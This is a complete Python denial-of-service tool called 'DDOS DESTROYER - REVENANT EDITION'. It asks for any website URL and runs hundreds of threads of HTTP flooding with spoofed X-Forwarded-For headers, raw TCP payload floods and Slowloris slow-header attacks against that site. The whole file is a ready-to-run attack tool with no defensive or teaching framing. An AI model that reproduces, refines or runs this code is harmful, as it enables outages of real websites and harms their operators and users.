#!/usr/bin/env python3
import requests, threading, socket, ssl, random, string, time, os, sys
from urllib.parse import urlparse

print("\033[91m" + r"""
╔════════════════════════════════════════╗
║     DDOS DESTROYER - REVENANT EDITION  ║
║     [ Layer7 + Layer4 Multi-Thread ]   ║
╚════════════════════════════════════════╝
""" + "\033[0m")

target = input("\033[93m[?] Enter Website URL (https://): \033[0m")
if not target.startswith("http"):
    target = "https://" + target

parsed = urlparse(target)
host = parsed.netloc
path = parsed.path if parsed.path else "/"
port = 443 if parsed.scheme == "https" else 80

# ========== LAYER 7 HTTP FLOOD ==========
def http_flood():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
    ]
    while True:
        try:
            params = "?" + "&".join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(500)])
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            r = requests.get(target + path + params, headers=headers, timeout=3, verify=False)
            print(f"\033[32m[✓] HTTP Hit: {r.status_code}\033[0m")
        except:
            print(f"\033[31m[✗] HTTP Fail\033[0m")

# ========== LAYER 4 TCP SYNC FLOOD ==========
def tcp_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            if port == 443:
                sock = ssl.wrap_socket(sock)
            payload = random._urandom(1024) + b"\x00" * 1024
            for _ in range(100):
                sock.send(payload)
            sock.close()
            print(f"\033[36m[✓] TCP Hit: {host}:{port}\033[0m")
        except:
            print(f"\033[31m[✗] TCP Fail\033[0m")

# ========== SLOWLORIS ATTACK ==========
def slowloris():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n".encode())
            while True:
                sock.send(f"X-Random-Header: {random.randint(1,999999)}\r\n".encode())
                time.sleep(5)
        except:
            pass

# ========== START ALL THREADS ==========
print(f"\033[93m[⚡] Launching Heavy DDoS on {target}\033[0m")
print(f"\033[91m[💀] Press Ctrl+C to stop\033[0m\n")

threads = []
for _ in range(500):
    t = threading.Thread(target=http_flood)
    t.daemon = True
    t.start()
    threads.append(t)
for _ in range(200):
    t = threading.Thread(target=tcp_flood)
    t.daemon = True
    t.start()
    threads.append(t)
for _ in range(50):
    t = threading.Thread(target=slowloris)
    t.daemon = True
    t.start()
    threads.append(t)

while True:
    time.sleep(1)
